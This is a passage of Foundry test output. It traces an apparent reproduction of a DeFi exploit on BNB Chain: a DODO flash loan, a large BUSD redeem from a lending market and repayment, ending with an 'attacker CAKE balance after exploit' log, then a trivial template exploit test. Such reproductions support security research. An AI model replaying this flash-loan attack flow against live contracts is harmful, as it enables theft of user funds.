    тФВ   тФВ   тФВ   тФВ   тФЬтФА [531] 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56::balanceOf(0x95c78222B3D6e262426483D42CfA53685A67Ab9D) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 111563712666643952909666939 [1.115e26]
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [3080] 0xfD36E2c2a6789Db23113685031d7F16329158384::treasuryPercent() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [2412] 0xAe8Ba50ee0a0E55EC21bf4ffE2c48d2FdF52D3e6::treasuryPercent() [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [23171] 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 400000000000000000000000 [4e23])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0x95c78222B3D6e262426483D42CfA53685A67Ab9D, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 400000000000000000000000 [4e23])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x95c78222B3D6e262426483D42CfA53685A67Ab9D, value: 1842280795285372 [1.842e15])
    тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Redeem(redeemer: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], redeemAmount: 400000000000000000000000 [4e23], redeemTokens: 1842280795285372 [1.842e15])
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [1012] 0xfD36E2c2a6789Db23113685031d7F16329158384::redeemVerify(0x95c78222B3D6e262426483D42CfA53685A67Ab9D, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 400000000000000000000000 [4e23], 1842280795285372 [1.842e15])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [399] 0xAe8Ba50ee0a0E55EC21bf4ffE2c48d2FdF52D3e6::redeemVerify(0x95c78222B3D6e262426483D42CfA53685A67Ab9D, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 400000000000000000000000 [4e23], 1842280795285372 [1.842e15]) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 
    тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    тФВ   тФВ   тФЬтФА [3271] 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56::transfer(0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4, 400000000000000000000000 [4e23])
    тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4, value: 400000000000000000000000 [4e23])
    тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФЬтФА [2534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4) [staticcall]
    тФВ   тФВ   тФФтФА тЖР [Return] 1913650014938482422526 [1.913e21]
    тФВ   тФЬтФА [531] 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56::balanceOf(0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4) [staticcall]
    тФВ   тФВ   тФФтФА тЖР [Return] 432418260037384524464291 [4.324e23]
    тФВ   тФЬтФА [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4) [staticcall]
    тФВ   тФВ   тФФтФА тЖР [Return] 1913650014938482422526 [1.913e21]
    тФВ   тФЬтФА [531] 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56::balanceOf(0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4) [staticcall]
    тФВ   тФВ   тФФтФА тЖР [Return] 432418260037384524464291 [4.324e23]
    тФВ   тФЬтФА emit DODOFlashLoan(: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : 0, : 400000000000000000000000 [4e23])
    тФВ   тФФтФА тЖР [Stop] 
    тФЬтФА [531] 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    тФВ   тФФтФА тЖР [Return] 29913717660761050982637 [2.991e22]
    тФЬтФА emit log_named_decimal_uint(key: "[End] Attacker CAKE balance after exploit", val: 29913717660761050982637 [2.991e22], decimals: 18)
    тФФтФА тЖР [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 339.73ms (11.95ms CPU time)

Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    тФЬтФА [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    тФВ   тФФтФА тЖР [Return] 
    тФЬтФА emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    тФЬтФА emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    тФФтФА тЖР [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 344.11ms (164.63┬╡s CPU time)

Ran 2 test suites in 601.68ms (683.85ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
